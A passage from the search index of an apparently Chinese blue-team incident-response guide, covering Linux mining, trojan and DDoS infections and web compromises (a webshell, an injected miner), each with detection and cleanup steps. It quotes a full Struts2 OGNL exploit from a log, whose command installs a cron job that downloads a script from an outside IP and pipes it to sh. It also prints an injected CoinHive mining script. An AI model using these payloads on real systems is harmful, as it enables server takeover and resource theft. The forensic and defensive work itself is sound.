$7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x04_1","text":"\u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002","title":"0x04 \u5c0f\u7ed3"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#3","text":"","title":"\u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_2","text":"\u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_2","text":"\u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_2","text":"","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#a","text":"\u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002","title":"A\u3001\u6392\u67e5\u8fc7\u7a0b"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#b","text":"\u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002","title":"B\u3001\u6eaf\u6e90\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#c","text":"1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b:","title":"C\u3001\u6e05\u9664\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#d","text":"\u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c","title":"D\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x03","text":"\u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"0x03 \u9632\u8303\u63aa\u65bd"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#4","text":"","title":"\u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_3","text":"Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_3","text":"\u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_3","text":"\u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x03_1","text":"RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/","title":"0x03 \u547d\u4ee4\u66ff\u6362"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#5ddos","text":"","title":"\u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#_1","text":"\u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#_2","text":"\u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"\u7cfb\u7edf\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/","text":"\u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7f51\u7ad9\u88ab\u690d\u5165webshell\uff0c\u610f\u5473\u7740\u7f51\u7ad9\u5b58\u5728\u53ef\u5229\u7528\u7684\u9ad8\u5371\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5229\u7528\u6f0f\u6d1e\u5165\u4fb5\u7f51\u7ad9\uff0c\u5199\u5165webshell\u63a5\u7ba1\u7f51\u7ad9\u7684\u63a7\u5236\u6743\u3002\u4e3a\u4e86\u5f97\u5230\u6743\u9650 \uff0c\u5e38\u89c4\u7684\u624b\u6bb5\u5982\uff1a\u524d\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0cSql\u6ce8\u5165\u5199\u5165\u6587\u4ef6\u7b49\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4 \u00b6 \u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002 2\u3001Web \u65e5\u5fd7\u5206\u6790 \u00b6 \u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3 3\u3001\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49 4\u3001\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668 5\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002 \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u00b6 \u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100% \u95ee\u9898\u89e3\u6790 \u00b6 \u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002 \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u00b6 \u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7f51\u9875\u3002\u800c\u4e14\uff0c\u653b\u51fb\u8005\u5728\u6302\u9ed1\u9875\u4ee5\u540e\uff0c\u4f1a\u5728\u4e00\u4e9b\u5c0f\u8bba\u575b\u6ce8\u518c\u9a6c\u7532\u5c06\u4f60\u7684\u7f51\u7ad9\u9ed1\u9875\u94fe\u63a5\u53d1\u5230\u8bba\u5